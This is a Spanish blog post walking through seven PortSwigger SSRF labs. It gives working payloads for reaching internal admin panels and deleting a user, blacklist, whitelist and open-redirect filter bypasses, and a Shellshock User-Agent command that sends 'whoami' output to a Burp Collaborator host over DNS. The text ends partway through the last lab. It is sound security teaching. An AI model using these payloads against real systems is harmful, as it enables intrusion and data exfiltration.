---
layout: single
title: SSRF - Laboratorios de PortSwigger
excerpt: "En este post explicaremos ¿Qué es? y como se realiza un ataque SSRF, server side request forgery, así también veremos algunos de los tipos de SSRF más comunes que se suelen encontrar dentro de páginas web."
date: 2023-04-25
classes: wide
header:
  teaser: /assets/images/LabsSSRF/banner.jpg
  teaser_home_page: true
#  icon: /assets/images/hackthebox.webp
categories:
  - vulnerabilidad web
tags:  
  - SSRF
  - Portswigger
---

<br>

**Índice de contenido**

- [¿Qué es un ataque SSRF?](#id1)
- [SSRF básico contra el servidor local.](#id2)
- [SSRF básico contra otro sistema back-end.](#id3)
- [SSRF con filtro de entrada basado en lista negra.](#id4)
- [SSRF con omisión de filtro a través de vulnerabilidad de redirección abierta.](#id5)
- [SSRF blind con detección fuera de banda(out of band).](#id6)
- [SSRF con filtro de entrada basado en lista blanca.](#id7)
- [SSRF ciego con explotación de Shellshock](#id8)

<br>

<div id='id1' />

# ¿Qué es un ataque SSRF?

Un ataque SSRF(server side request forgery), Este ataque se da cuando una aplicación web, nos permite aprovecharnos de algún recurso para manipular y dirigir una petición maliciosa hacia el mismo servidor y obtener la respuesta.

Esto lo veremos más claro con el siguiente ejemplo, supongamos que tenemos nuestra máquina atacante, y tenemos conexión a un servidor web, pero solo podemos acceder a este servidor web por el puerto 80(HTTP):

![ssrf1](/assets/images/LabsSSRF/ssrf1.png)

como mencione en la imagen, tenemos acceso al servidor web por el puerto 80, pero si intentamos acceder, o escanear los puertos que tiene abiertos internamente el servidor podremos ver que no nos va a dejar hacer algo.

Y esto es obviamente causado por algún firewall que hace que esos puertos no puedan salir de su red interna.

El único que tiene conexión directa con esos puertos internos es el servidor víctima.

<br>

Ahora supongamos un caso donde al servidor por el puerto 80 al cual tenemos acceso, contiene una función la cual es que incluye algo como un buscador dentro de la web, y lo que hace es mostrarnos el contenido de lo que le pidamos, en este caso debería mostrarnos la web de google:

![ssrf2](/assets/images/LabsSSRF/ssrf2.png)

Y la web nos interpretará ese contenido desde la función del servidor víctima, pero ahora algo que podríamos hacer, es que como vemos que el puerto 8080, el cual no tenemos acceso, supongamos que dicho puerto corre un servicio HTTP, el cual contiene una página web que solo debería acceder las personas de la red interna.

Pero en este caso, como la función del buscador está siendo ejecutada por el servidor víctima, el cual tiene conexión con dichos puertos, lo que podemos hacer es lo siguiente:

![funcion](/assets/images/LabsSSRF/funcion.png)

Ahora podemos apreciar que en la función hemos puesto la URL apuntando hacia el puerto 8080 internos del servidor web, y como esta función si tiene acceso a dichos puertos, entonces nos lo va a mostrar en la web que estamos viendo.

Como pusimos localhost en la URL, quiere decir que se conectara a su misma maquia servidor que lo ejecuta, pero por el puerto que le asignamos, en este caso el 8080, que contiene una web que no deberíamos poder ver en primer lugar, pero hemos podido gracias a que usamos este ataque SSRF por medio de la función de búsqueda.

Una vez entendido esto, pasemos a resolver el primer laboratorio.

<br>

<div id='id2' />

# Laboratorio 1: SSRF básico contra el servidor local

Este laboratorio es un ejemplo muy básico, pero que se logra entender la idea del SSRF, lo que nos piden es lo siguiente:

![lab1](/assets/images/LabsSSRF/lab1/lab1.png)

Nos dice que este laboratorio contiene una función de verificar existencias que obtiene datos de un sistema interno.

Y que debemos acceder a un panel de admin interno y eliminar al usuario carlos.

Esto es parecido a los laboratorios de vulnerabilidades anteriores, así que primero iremos a la web y entraremos a un producto para encontrar la función de verificar existencias:

![func](/assets/images/LabsSSRF/lab1/funcion.png)

Como podemos ver, la función se encuentra aquí y al darle click nos toma datos de un sistema interno que registra los productos disponibles.

<br>

Así que lo que haremos ahora será interceptar una petición de esa función usando BurpSuite, y veremos la siguiente petición:

![peticion](/assets/images/LabsSSRF/lab1/peticion.png)

Podemos observar que en esta petición tenemos una URL, y vemos que al parecer esta url-encodeada, por lo que seleccionaremos la URL, y al dar ctrl + shift + u hacemos el proceso inverso de url-encodear, o sea que estamos quitando la codificación URL y veremos algo así:

![err](/assets/images/LabsSSRF/lab1/error.png)

Vemos que nos da el siguiente error, ya que debe estar url-encodeada, así que antes de volver a url-encodearla, podemos apreciar que hay una URL la cual es:

`http://stock.weliketoshop.net:8080/product/stock/check?productId=6&storeId=1`

Así que con esto podemos saber que por detrás se está llamando a la web de la URL por el puerto 8080, y accediendo a un recurso dado por medio de los parámetros, pero en este caso lo que haremos será acceder al panel de admin que nos da el laboratorio como reto.

Así que cambiaremos la URL de la petición por la que nos dice el laboratorio que se encuentra el panel admin:

`http://localhost/admin`

> Lo que estamos haciendo aquí es acceder al mismo servidor de la máquina, pero a la sección de administrador, cosa que no podemos hacer directamente desde nuestra PC atacante, pero si usando el servidor que se mande a sí mismo una consulta maliciosa como esta.

![admin](/assets/images/LabsSSRF/lab1/admin.png)

Podemos ver que nos ha cargado una página, la de administrador.

> No dejes espacios en la petición interceptada, ya que puede dar errores.

Ahora mandaremos esta petición, pero la que está en el intercept para verla reflejada en nuestro navegador que se conecta con burp:

![intercept](/assets/images/LabsSSRF/lab1/intercept.png)

Y al tramitarla podemos ver que en la web del navegador se nos agregó esto:

![panel](/assets/images/LabsSSRF/lab1/panel.png)

Y al darle click a eliminar el usuario nos carga lo siguiente:

![no](/assets/images/LabsSSRF/lab1/no.png)

Vemos que nos dice que debemos hacer esto desde el panel de administrador y no nos deja hacerlo, pero si apreciamos arriba en la URL vemos estos parámetros:

**/admin/delete?username=carlos**

Por lo que simplemente haremos la petición anterior de nuevo, pero esta vez agregando dichos parámetros, y nos quedará así:

`http://localhost/admin/delete?username=carlos`

![delete](/assets/images/LabsSSRF/lab1/delete.png)

Y al tramitar esta petición habremos terminado el laboratorio:

![end](/assets/images/LabsSSRF/lab1/end.png)

<br>

<div id='id3' />

# Laboratorio 2: SSRF básico contra otro sistema back-end

En este siguiente laboratorio veremos que nos piden realizar lo siguiente:

![lab2](/assets/images/LabsSSRF/lab2/lab2.png)

Nos dice que dentro de la red interna del servidor víctima, hay otros equipos dentro de esa red interna, pero que debemos encontrar el que tiene el puerto 8080 abierto y acceder a él y una vez accedamos debemos eliminar el usuario de carlos.

Por ejemplo:

![ips](/assets/images/LabsSSRF/lab2/ips.png)

Como podemos ver en la imagen, vemos que en la red interna(marcada en verde), está en un rango donde varias máquinas tienen conexión entre sí, por lo que como nos dice el reto, debemos conectarnos a un host diferente aparte del localhost, por lo que para averiguar que otro host tiene el puerto 8080 abierto(en este caso), haremos lo siguiente.

<br>

Primero interceptaremos la petición para ver como se tramita lo que nos interesa, como ya sabemos, la vulnerabilidad está en la función de comprobar existencias de un producto, por lo cual interceptaremos una petición sobre eso:

![decode](/assets/images/LabsSSRF/lab2/decode.png)

Y ahora vemos lo siguiente que como sabemos lo tenemos que url-decodear como se ve en la imagen (usando ctrl + shift + u), y veremos la siguiente línea:

`stockApi=http://192.168.0.1:8080/product/stock/check?productId=1&storeId=1`

Así que apreciamos que se está conectando a una IP, la cual es **192.168.0.1**, pero en este caso debemos descubrir que otro host en la red tiene el puerto 8080 abierto, sabemos que en cada red pueden existir 255 hosts, por lo que usando BurpSuite haremos un ataque para ir descubriendo que IP nos responde un mensaje de estado true.

<br>

Para esto mandaremos la petición al intruder:

![intruder](/assets/images/LabsSSRF/lab2/intruder.png)

Como sabemos que existe la ruta /admin en este servidor, entonces es probable que exista en los otros host, por lo que nuestro payload del intruder quedará así.

Una vez tengamos la petición en el intruder y le hayamos modificado lo de la ruta, ahora agregaremos donde irá el payload, que obviamente será en el último valor de la IP, y al seleccionar ese apartado daremos a add y nos quedará así:

![add](/assets/images/LabsSSRF/lab2/add.png)

Así que nuestro payload quedaría como en la imagen.

Ahora vamos a la pestaña de payloads para cargar el ataque que queremos hacer:

![payload](/assets/images/LabsSSRF/lab2/payload.png)

Configuramos el payload de tipo numérico, que empiece desde el número 1 hasta el 254 (el total de hosts), y que avance de 1 en 1.

Así que una vez configurado, daremos en start attack y después de un rato veremos que al filtrar por estado de respuesta vemos que recibimos una en estado true(200):

![doscientos](/assets/images/LabsSSRF/lab2/doscientos.png)

Podemos apreciar que recibimos esta respuesta, la cual es el panel del admin, y el host que nos respondió fue el 42.

Así que en la respuesta de esta petición buscaremos por la palabra delete, y encontraremos la API que nos permite eliminar usuarios:

![delete](/assets/images/LabsSSRF/lab2/delete.png)

Y vemos que el contenido para eliminar el usuario carlos es:

`http://192.168.0.42:8080/admin/delete?username=carlos`

Así que simplemente agregaremos esta URL a la petición original que está en el intercept:

![intruder2](/assets/images/LabsSSRF/lab2/intruder2.png)

Quedándonos así, como si estuviésemos dándole al botón de eliminar usuario de carlos, pero esta vez es por medio de las peticiones, así que al tramitarla veremos que habremos terminado este laboratorio:

![final](/assets/images/LabsSSRF/lab2/final.png)

<br>

<div id='id4' />

# Laboratorio 3: SSRF con filtro de entrada basado en lista negra

En el siguiente laboratorio, nos piden hacer lo siguiente:

![lab3](/assets/images/LabsSSRF/lab3/lab3.png)

Vemos que nos dice que debemos hacer algo similar al laboratorio anterior, pero esta vez en desarrollador de la web ha implementado una función anti ataques SSRF, por lo que tendremos que encontrar una forma de burlar esta función.

El objetivo es eliminar al usuario carlos por medio de una URL que nos dan como base **http://localhost/admin**, así que iniciemos.

<br>

Primero interceptaremos la petición que sabemos es vulnerable a SSRF:

![peticion](/assets/images/LabsSSRF/lab3/peticion.png)

Podemos ver la petición que la hemos decodificado el formato de url-encode.

Si enviamos la petición así nos dará error:

![error](/assets/images/LabsSSRF/lab3/error.png)

Como vemos en la respuesta nos da error, ya que esta petición puede tramitarse, pero el símbolo de "&" necesita estar url-encodeado, así que lo encodeamos y al tramitar de nuevo vemos que ahora si nos responde lo que debe:

![peticion2](/assets/images/LabsSSRF/lab3/peticion2.png)

Y vemos que nos funciona, puesto que el simbolo se url-encodea.

Ahora lo que intentaremos hacer es lo que nos pide, dice que debemos conectarnos al host local y acceder a la ruta /admin desde la siguiente URL:

`http://localhost/admin`

Y la agregaremos a la petición para ver que nos responde:

![blocked](/assets/images/LabsSSRF/lab3/blocked.png)

Podemos apreciar que en la respuesta vemos el mensaje "External stock check blocked for security reasons", por lo que esto es la función de seguridad anti-SSRF que nos dice el laboratorio que está implementado en este nivel.

Así que una manera que pensamos de evadir esto es llamar a la IP en lugar del DNS de localhost quedando así:

`http://127.0.0.1/admin`

Y veremos que nos responde:

![blocked2](/assets/images/LabsSSRF/lab3/blocked2.png)

Podemos ver que de esta manera tampoco nos ha funcionado y nos sigue marcando el mensaje de seguridad.

<br>

Lo que intentaremos ahora será usar la IP, pero esta vez en hexadecimal, el número con el que empieza la IP (127) en hexadecimal es 0x7f y podemos darnos cuenta usando la función hex de python3:

![hex](/assets/images/LabsSSRF/lab3/hex.png)

Ahora, como los valores que siguen de la IP de localhost son 001, simplemente las juntaremos formando en total el valor: "0x7f000001".

Así que probaremos con este valor en la petición del repeater:

![blocked3](/assets/images/LabsSSRF/lab3/blocked3.png)

Y vemos que nos da error, y si intentamos quitando la ruta admin:

![500](/assets/images/LabsSSRF/lab3/500.png)

Apreciamos que esta vez nos da un error de estado 500.

Por lo que esta manera tampoco nos ha funcionado.

<br>

Ahora probaremos de este modo, cuando en la IP hay números "0" consecutivos, por ejemplo: 127.0.0.1, se puede acortar a 127.1, ya que los 0 no se toman en cuenta, así que si hacemos esto en la petición veremos lo siguiente:

![200](/assets/images/LabsSSRF/lab3/200.png)

Vemos que esta vez nos ha dado un estado de respuesta 200, por lo que ya es buena señal porque ahora nos está dejando acceder al contenido de localhost(la web principal) desde la misma petición, pero ahora tendremos que acceder a la ruta /admin, y vemos que al agregar la ruta /admin vemos lo siguiente:

`http://127.1/admin`

![blocked4](/assets/images/LabsSSRF/lab3/blocked4.png)

Así que nuevamente nos está bloqueando acceder a esa ruta, pero vemos que si es /admin nos da el mensaje de seguridad, pero en caso de ponerle algo que no exista, por ejemplo, pondremos la ruta /prueba:

`http://127.1/prueba`

![prueba](/assets/images/LabsSSRF/lab3/prueba.png)

Y vemos que nos da un mensaje diferente al que nos da si ponemos /admin, por lo que nos damos cuenta de que por detrás debe haber algún filtro evitando que accedamos a la ruta /admin por medio del valor de nombre admin.

Así que ahora intentaremos acceder a la ruta sin poner el nombre de la ruta exactamente como se ve.

<br>

Ahora lo que intentaremos será url-encodear la letra "a" de "admin", para esto seleccionamos la letra "a" de admin, y damos a click izquierdo>convert-selection>URL>url-encode-all-characters.

Quedándonos así:

`http://127.1/%61dmin`

Y al tramitar la petición vemos que nos responde lo siguiente:

![admin](/assets/images/LabsSSRF/lab3/admin.png)

Vemos que nos da un error, así que tal vez nos esté interpretando el símbolo de % como ese símbolo y no como parte del url-encode, así que también url-encodearemos ese símbolo quedando así:

`http://127.1/%2561dmin`

Y ahora, al tramitar la petición, veremos lo siguiente:

![delete](/assets/images/LabsSSRF/lab3/delete.png)

Vemos que por fin hemos logrado acceder a /admin evadiendo el filtro de seguridad.

<br>

Ahora solo quedaría buscar la API de eliminar usuarios en el código de la petición:

![api](/assets/images/LabsSSRF/lab3/api.png)

Y ahora debemos poner esa función que hace en la URL original del intercept:

`http://127.1/%2561dmin/delete?username=carlos`

![intercept](/assets/images/LabsSSRF/lab3/intercept.png)

Y al tramitarla habremos terminado con este laboratorio:

![final](/assets/images/LabsSSRF/lab3/final.png)

<br>

<div id='id5' />

# Laboratorio 4: SSRF con omisión de filtro a través de vulnerabilidad de redirección abierta

En este laboratorio, podemos ver que nos pide hacer lo siguiente:

![lab4](/assets/images/LabsSSRF/lab4/lab4.png)

Nos dice que existe una función de verificar existencias, que obtiene los datos que muestra de un sistema de red interno.

También nos dice que debemos cambiar la URL de verificar existencias y reemplazarla por:

`http://192.168.0.12:8080/admin`

Que es un servidor interno el cual por el puerto 8080 corre un panel de administrador para eliminar usuarios, en este caso debemos eliminar el usuario carlos.

Y nos dice que la función de verificar existencias ya no nos permite ingresar URL como lo habíamos hecho en el laboratorio pasado, sino que ahora tendremos que buscar una redirección abierta, esto significa que debe ser una redirección a una parte de la web a la que nos deje acceder para modificar esa redirección por la que deseamos, que en este caso será http://192.168.0.12:8080/admin.

<br>

Entramos al laboratorio, a un producto para ver la función de verificar existencias que sabemos, es vulnerable.

![funcion](/assets/images/LabsSSRF/lab4/funcion.png)

Como recordamos, esta es la función de verificar existencias similar a las de todos los laboratorios anteriores.

Así que al interceptar una petición de esa función veremos lo siguiente:

![encodeado](/assets/images/LabsSSRF/lab4/encodeado.png)

Como hemos visto esta url-encodeado, y seleccionamos la parte que nos interesa y la url-decodeamos con: ctrl+shift+u, una vez decodificada la URL, se verá algo así:

![decodeado](/assets/images/LabsSSRF/lab4/decodeado.png)

`stockApi=/product/stock/check?productId=1&storeId=1`

Podemos apreciar que esta vez no está llamando a algún servidor interno, sino que ahora está llamando a una ruta del servidor mismo.

La ruta es /product/stock/check, la cual esta última tiene un parámetro del ID del producto.

Pero lo que nos llama la atención es que ya no se está tramitando por medio de una URL.

Así que para verificar si aún puede tramitar la petición por medio de una URL dada, probaremos con la URL de localhost:

`stockApi=http://localhost/`

Y vemos que nos dice lo siguiente en la respuesta:

![400](/assets/images/LabsSSRF/lab4/400.png)

Por lo que podemos ver en la respuesta, no nos acepta la URL, y no es que haya un firewall bloqueando el acceso a localhost, simplemente en este apartado no admite las URL.

Por lo que intentaremos buscar darle por otro lado, investigando entre diferentes apartados de la web, descubrimos lo siguiente:

![next](/assets/images/LabsSSRF/lab4/next.png)

Un apartado que nos redirecciona al siguiente artículo, y esto nos interesa esto, ya que es diferente la petición a las que intente en otros lugares de la web.

Y esta petición al interceptarla nos muestra lo siguiente:

![redirect](/assets/images/LabsSSRF/lab4/redirect.png)

Podemos ver que al tramitar esa petición desde el repeater nos da un estado de respuesta 302, el cual significa que nos está redirigiendo a algún lugar dentro de la página, en este caso.

Y esto nos damos cuenta, ya que en la parte de arriba de la petición vemos que nos está tramitando la petición por el método GET, con el siguiente contenido:

`/product/nextProduct?currentProductId=1&path=/product?productId=2`

Vemos que está accediendo a una ruta, similar a la primera petición que vimos, pero en este caso vemos un parámetro extra, el cual es **path**, y está recibiendo una ruta de redirección.

Así que tal vez ese parámetro admita URL, y nos permita hacer lo que queríamos en un principio.

Y para enterarnos si admite formato de URL, haremos lo siguiente:

Copiaremos la ruta que sabemos que existe, gracias a la petición de la redirección, la ruta es:

`/product/nextProduct?currentProductId=1&path=http://localhost`

Y vemos que en el parámetro del path, hemos agregado la URL de localhost, para así averiguar si nos responderá algo.

Después esta URL que hemos hecho, la pondremos en la petición primera que tuvimos, ya que esta petición era la que ejecutaba algo que le dábamos, lo interpretaba en el apartado de verificar existencias, así que veremos lo que pasa, tenemos nuestra petición así:

![intruder](/assets/images/LabsSSRF/lab4/intruder.png)

`/product/nextProduct?currentProductId=1%26path=http://localhost`

> Como sabemos el símbolo de & debe ir en url-encode para evitar errores.

<br>

Y al tramitar esta petición, veremos en el navegador lo siguiente:

![funcion2](/assets/images/LabsSSRF/lab4/funcion2.png)

Vemos que en la parte de verificar existencias se ha interpretado la petición que hemos tramitado, por lo que es vulnerable, así que ahora en vez de llamar a la misma página, llamaremos a la web del servidor que está en la red interna por el puerto 8080 que nos da el mismo laboratorio como reto, quedando así la petición:

`/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin`

![panel](/assets/images/LabsSSRF/lab4/panel.png)

Como vemos hemos mandado la petición principal al repeater, y hemos visto que nos ha mostrado el panel de admin, el cual en el código de esa respuesta encontramos como ya sabemos lo de la API de eliminar usuario:

![delete](/assets/images/LabsSSRF/lab4/delete.png)

Por último agregaremos lo de esa API a la petición original, quedándonos así:

`/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos`

![api](/assets/images/LabsSSRF/lab4/api.png)

Y al tramitar la petición se habrá eliminado al usuario carlos, y vemos que habremos terminado de resolver este laboratorio:

![end](/assets/images/LabsSSRF/lab4/end.png)

<br>

<div id='id6' />

# Laboratorio 5: SSRF blind con detección fuera de banda(out of band)

En este laboratorio nos piden lo siguiente:

![lab5](/assets/images/LabsSSRF/lab5/lab5.png)

Vemos que nos dice que esta página web utiliza un software de análisis, y este software lo que hace es tomar de la cabecera de la petición la parte de referencia cuando abrimos algún producto.

Este tipo de peticiones contienen en su cabecera información útil para estos programas de análisis, lo que hace es que primero toma la URL de la referencia de la petición, esta referencia sirve para saber de qué lugar viene esta petición, por ejemplo si viene de alguna otra web donde hayan puesto el enlace a este producto, en la referencia aparecerá esa otra web de donde viene, y esto es útil para el software y sacar análisis para saber de donde es que vienen sus vistas etc. Y para esto se le hace una petición a la URL que esté en el apartado de referencia de la petición.

Pero nosotros usaremos esto para hacer algo.

Al abrir el laboratorio veremos la tienda común:

![tienda](/assets/images/LabsSSRF/lab5/tienda.png)

Y como recordamos nos decía que al abrir un producto se ejecuta lo de la función de análisis, que lo que hace esa función es, como dije anteriormente, tomar la URL y hacerle una petición a esa URL referenciada.

Así que al interceptar la petición al abrir algún producto de la tienda veremos lo siguiente:

![referer](/assets/images/LabsSSRF/lab5/referer.png)

`Referer: https://0a96003804c1326a834e92c900a40009.web-security-academy.net/`

Podemos apreciar que nos está haciendo referencia en este caso a la misma web en el header de la petición.

Así que sabemos que lo que hace la función que está en el servidor web es ejecutar una petición hacia la URL que se encuentra en la referencia de la petición.

<br>

Así que para saber si es vulnerable a ataques SSRF, que nos permitiría en caso de funcionar, poder ejecutar recursos dentro del mismo sistema que como usuarios normales no tenemos acceso, pero si lo hacemos desde su mismo servidor sí que tendremos.

Así que modificaremos la URL y pondremos la del servidor tercero de BurpCollaborator, que como sabemos debemos dar en Burp>BurpCollaboratorClient.

![collaborator](/assets/images/LabsSSRF/lab5/collaborator.png)

Y una vez hecho esto, lo que haremos ahora será darle en Copy to clipboard para copiar el enlace del servidor temporal tercero de burpcollaborator.

<br>

Una vez tengamos la URL copiada, lo que haremos será pegar la URL del servidor de burpcollaborator en la cabecera donde dice referer en la petición:

![burp](/assets/images/LabsSSRF/lab5/burp.png)

`Referer: http://8y7er84x9d6yix39f09sdsnbv21tpi.burpcollaborator.net`

Quedándonos como se ve en la imagen anterior.

<br>

Ahora simplemente tramitaremos esa petición, y a través de la respuesta del BurpCollaborator veremos lo siguiente al darle en pollnow:

![response](/assets/images/LabsSSRF/lab5/response.png)

Y como podemos ver, hemos tenido comunicación desde la parte de referencia hacia nosotros, donde le indicamos que hiciera la petición, por lo que habremos terminado este laboratorio.

Este solo fue para mostrarnos y explicarnos la manera en que se comunica a la URL dada en la referencia de la cabecera de la petición.

Pero para hacer algo importante lo veremos en el laboratorio siguiente, así que habremos terminado este:

![end](/assets/images/LabsSSRF/lab5/end.png)

<br>

<div id='id7' />

# Laboratorio 6: SSRF con filtro de entrada basado en lista blanca

En este laboratorio nos piden lo siguiente:

![lab6](/assets/images/LabsSSRF/lab6/lab6.png)

Nos dice que este laboratorio contiene una tienda con productos y que en los productos está una función de verificar existencias, la cual nos dice que esa es la parte vulnerable, dice que debemos cambiar la URL que viene en la petición de verificar existencias y reemplazarla por **http://localhost/admin** y que eliminemos el usuario carlos, también nos dice que existe una función anti-SSRF que deberemos burlar y por último eliminar al usuario carlos.

Así que comencemos por interceptar la petición de verificar existencias:

![peticion](/assets/images/LabsSSRF/lab6/peticion.png)

Vemos qué hemos url-decodeado la petición y la enviamos al repeater, recuerda url-encodear el símbolo de & para evitar errores.

Y en la respuesta vemos que nos responde todo bien.

<br>

Así que lo primero que intentaremos será reemplazar la URL por defecto por la que nos dice el nivel que debemos reemplazar:

![error](/assets/images/LabsSSRF/lab6/error.png)

Podemos apreciar que nos lanza el mensaje siguiente: **"External stock check host must be stock.weliketoshop.net"**, y nos dice que no podemos usar algo en la URL que no sea del dns **stock.weliketoshop.net**, así que esto es a lo que se refería el nivel con la función anti-SSRF.

<br>

Así que en este punto es donde debemos bypassear este filtro.

Para seguir debemos saber lo siguiente, cuando quieres loguearte en una página web es posible hacerlo desde la misma URL, modificando la petición.

Así que nuestra petición quedará algo así al aplicar el login:

`stockApi=http://user:password@stock.weliketoshop.net:8080/product/stock/check?productId=1%26storeId=1`

Vemos que hemos agregado los valores **user:password**, y el @ es para indicarle el host al que se loguearan estos usuarios.

Y al tramitar la petición:

![userpass](/assets/images/LabsSSRF/lab6/userpass.png)

Vemos en la respuesta que nos responde un estado de respuesta correcto.

Por lo que es señal de que tenemos posibilidad de login.

<br>

Ahora vemos que quitando el apartado de password nos sigue dando una respuesta correcta:

`stockApi=http://user@stock.weliketoshop.net:8080/product/stock/check?productId=1%26storeId=1`

![user](/assets/images/LabsSSRF/lab6/user.png)

Con esto podemos estar más seguros de que es vulnerable.

Algo curioso que notamos es que en cada consulta nos devuelve un valor diferente en el contenido de la petición.

> Este método de login desde la URL puede ser útil si tenemos credenciales conseguidas por algún otro lado, tal vez desde algún LFI, etc.

<br>

Ahora, como sabemos que es posible lo de login, haremos lo siguiente:

`stockApi=http://localhost#@stock.weliketoshop.net:8080`

Lo que estamos haciendo aquí es acceder al dominio localhost en lugar de indicarle un usuario o password, y después usando el símbolo de #, lo que nos permite es identificar un fragmento de la web para que nos lleve a la parte de la web donde está ese fragmento.

Por ejemplo, si hay una web con muchos textos, pero solo queremos encontrar alguno, entonces usamos el # y pasarle el fragmento identificador y esto automáticamente nos llevara a la sección donde se encuentra esos datos.

<br>

Pero en este caso estamos usándolo en la URL que queremos que nos lleve, así que como es vulnerable, esto nos llevará a la página del dominio `stock.weliketoshop.net:8080`, pero esta vez nos estará llevando a ese lugar y no solo traer un valor para mostrarlo como lo hace por defecto que era lo del valor de existencias de productos.

Obviamente, antes de tramitar esta petición debemos URL-encodear el símbolo # para evitar errores de sintaxis:

`stockApi=http://localhost%23@stock.weliketoshop.net:8080`

![error1](/assets/images/LabsSSRF/lab6/error1.png)

Vemos que en la respuesta nos da un error, pero como recordamos puede ser porque la web interpreta el % como porcentaje y no como parte del url-encode, así que url-encodearemos el porcentaje quedando así:

`stockApi=http://localhost%2523@stock.weliketoshop.net:8080`

Y vemos que esta vez ya nos responde con un estado de respuesta 200:

![200](/assets/images/LabsSSRF/lab6/200.png)

Y en el render de la web podemos ver que nos ha llevado al panel que nos permite administrar la web:

![admin](/assets/images/LabsSSRF/lab6/admin.png)

Y accedimos aquí, ya que era vulnerable a SSRF y estamos accediendo a un lugar al que no deberíamos, pero como es vulnerable lo estamos haciendo, puesto que como recordamos desde la URL nos hicimos la petición hacia este dominio del cual solo deberíamos tener una respuesta, pero como es vulnerable accedemos a todo el contenido incluyendo el panel admin.

Así que resumiendo, usamos la vulnerabilidad SSRF, que está en la URL de verificar existencias, la cual nos permitió viajar al dominio del que como sabemos solo obtendríamos datos específicos, pero logramos acceder a todo el dominio gracias al # que nos redirige por completo a todo el contenido, ya que nos está llevando gracias a que es vulnerable y estamos dándole el dominio como identificador en lugar de alguna palabra clave.

<br>

Ahora debemos saber a donde nos lleva el botón que dice **admin panel**, para ello buscaremos en el código de la petición la palabra clave "admin panel", y veremos lo siguiente:

![panel](/assets/images/LabsSSRF/lab6/panel.png)

Podemos ver que nos lleva a la ruta /admin, así que iremos ahí agregándosela a la petición:

`stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin`

![users](/assets/images/LabsSSRF/lab6/users.png)

Vemos que nos lleva al panel para administrar los usuarios, por lo que en el código de esta petición buscaremos al usuario carlos que es el objetivo:

![carlos](/assets/images/LabsSSRF/lab6/carlos.png)

Y vemos que para eliminar este usuario debemos acceder a la URL /delete?username=carlos, quedandonos nuestra petición así:

`stockApi=http://localhost%2523@stock.weliketoshop.net:8080/admin/delete?username=carlos`

Y al tramitar la petición veremos lo siguiente:

![fin](/assets/images/LabsSSRF/lab6/fin.png)

Vemos que hemos logrado eliminar el usuario carlos y hemos terminado el laboratorio.

<br>

<div id='id8' />

# Laboratorio 7: SSRF ciego con explotación de Shellshock

En este último laboratorio nos están pidiendo lo siguiente:

![lab7](/assets/images/LabsSSRF/lab7/lab7.png)

Nos dice que este sitio web de la tienda contiene una función de análisis la cual obtiene la URL del apartado referer de la cabecera(header), de la petición.

Y esta función lo que hace es hacerle una petición a esa URL que se encuentra en el referer de la petición.

Después nos dice que debemos usar esa funcionalidad para manifestar un ataque SSRF ciego(blind).

Nos dice que existe un servidor interno por el puerto 8080 el cual se encuentra en el rango de 192.168.0.X.

Y que debemos hacer un ataque de shellshok, para filtrar el nombre de usuario del sistema operativo que se ejecuta en el servidor interno.

<br>

Primero interceptaremos la petición al elegir un producto:

![peticion](/assets/images/LabsSSRF/lab7/peticion.png)

Sabemos que en la parte de referer está la función de análisis la cual el mismo servidor hace una petición a la URL que se encuentra dentro del referer.

Que en este caso esa URL es: 

`Referer: https://0a8700a104027f96841aea6200990051.web-security-academy.net/`

Así que cambiaremos esa URL por la del BurpCollaborator, que como sabemos con el BurpCollaborator podemos activar un servidor tercero que se conectará y tendremos acceso al registro del servidor tercero y ver las consultas, respuestas, etc.

Cambiaremos esa URL por la del collaborator quedándonos así:

`Referer: http://0vw1bgzla4s8l1spkyfoxv2ho8uyin.burpcollaborator.net`

Y al tramitar esta petición veremos que se tramita con éxito:

![200](/assets/images/LabsSSRF/lab7/200.png)

Así que desde el BurpCollaborator debemos ver si recibimos alguna petición desde la petición anteriormente tramitada gracias al referer:

![collaborator](/assets/images/LabsSSRF/lab7/collaborator.png)

Y podemos apreciar que en efecto hemos recibido una petición HTTP y 2 DNS.

<br>

Así que con esto comprobamos que es vulnerable a SSRF, ya que estamos enviando peticiones hacia otros lugares que no deberían poderse, pero como es vulnerable es posible.

En la petición que recibimos del BurpCollaborator apreciamos que se está enviando el Host, y el User-Agent en la cabecera de la petición recibida.

Así que como recordamos nos dice que alguna IP en el rango de 192.168.0.X:8080 es vulnerable a Shellshock.

Y como vemos 2 cabeceras en la respuesta, podemos pensar que es posible que la cabecera vulnerable sea la de User-Agent, por lo que iremos a la petición que tenemos en el repeater y agregaremos el payload de shellshock en el User-Agent:

`User-Agent: () { :; }; /ruta/del/comando`

Lo que hace esta vulnerabilidad es permitirnos ejecutar comandos desde la cabecera del user-agent, y necesitamos ver la respuesta, para ello usaremos lo siguiente.

<br>

El comando nslookup nos sirve para consultar nombres de Dominio en un servidor dado. Y para saber esa información debe hacer consultas DNS.

Y como recordamos, en la parte vulnerable del SSRF tramita peticiones DNS, por lo que nos permitirá hacerlo.

Así que usaremos ese comando, pero no nos interesa saber el nombre del dominio ni recibiremos la respuesta de ese comando, pero lo que sí hará será enviar consultas DNS que usaremos más adelante, que usaremos para obtener el usuario del sistema operativo que ejecuta el servidor externo, así que lo que haremos será que le agregaremos al comando nuestro servidor tercero de BurpCollaborator.

Quedándonos así:


`User-Agent: () { :; }; /usr/bin/nslookup 3sw48jwo77pbi4psh1cruyzklbr2fr.burpcollaborator.net`

Así que esto está casi terminado, pero recordemos que no nos interesa ver el nombre del dominio, sino que queremos ver el usuario, y para ello podemos concatenar junto al servidor destino un comando.

Quedando nuestro User-Agent de la siguiente manera:

`User-Agent: () { :; }; /usr/bin/nslookup $(whoami).3sw48jwo77pbi4psh1cruyzklbr2fr.burpcollaborator.net`

Así que de esta forma, en la respuesta DNS que recibiremos no se verá la respuesta de lo que ejecuta el comando nslookup, pero como este comando tramita peticiones DNS, y en el servidor tercero al cual enviara esas peticiones vemos que le concatenamos el comando whoami, entonces en la respuesta DNS, en teoría deberemos recibir la respuesta del comando whoami junto a lo que el comando nslookup haga por los DNS.

<br>

Así que nuestro payload quedará así:

![shellshock](/assets/images/LabsSSRF/lab7/shellshock.png)

Por último, recordemos que esta petición debe enviarse a un host que está entre el rango de 192.168.0.X:8080, así que para saber esto, haremos un ataque de tipo sniper desde el intruder de Burpsuite, así que una vez mandemos esta petición al intruder, agregaremos en el referer el valor que será fuzzeado quedando así:

`Referer: http://192.168.0.1:8080`

